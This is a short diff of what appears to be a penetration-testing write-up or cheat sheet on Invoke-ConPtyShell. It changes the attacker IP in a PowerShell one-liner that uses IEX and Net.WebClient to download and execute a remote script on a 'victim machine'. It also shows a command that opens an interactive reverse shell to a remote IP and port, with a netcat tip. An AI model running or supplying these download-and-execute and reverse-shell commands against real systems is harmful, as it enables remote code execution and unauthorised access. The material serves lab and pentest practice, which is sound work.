@@ -27,7 +27,7 @@ Invoke-ConPtyShell -RemoteIp 10.0.0.2 -RemotePort 3001 -Rows 43 -Cols 186
 
 3) This command line will download and execute this file from the victim machine so you need to open your -RemotePort first:
 ```powershell
-IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/Invoke-ConPtyShell.ps1')
+IEX(New-Object Net.WebClient).downloadString('http://10.10.16.2/Invoke-ConPtyShell.ps1')
 ```
 > For the reverse shell is imperative to use netcat without rlwrap.
 {: .prompt-warning }
